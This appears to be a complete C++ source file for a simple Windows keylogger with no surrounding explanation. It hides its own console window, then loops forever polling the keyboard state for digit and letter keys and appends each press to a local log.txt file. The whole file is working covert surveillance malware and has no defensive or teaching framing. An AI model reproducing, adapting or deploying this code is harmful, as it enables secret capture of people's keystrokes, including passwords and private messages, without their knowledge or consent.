#include <windows.h>
#include <fstream>

int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	std::ofstream f;
	while (true) {
		Sleep(15);
		for (int i = 48; i <= 90; i++) {
			if ((i <= 57 || i >= 65) && (GetAsyncKeyState(i) == -32767)) {

				f.open("log.txt", std::ofstream::app);
				f << char(i) << "\n";
				f.close();
			}
		}
	}
	return 0;
}
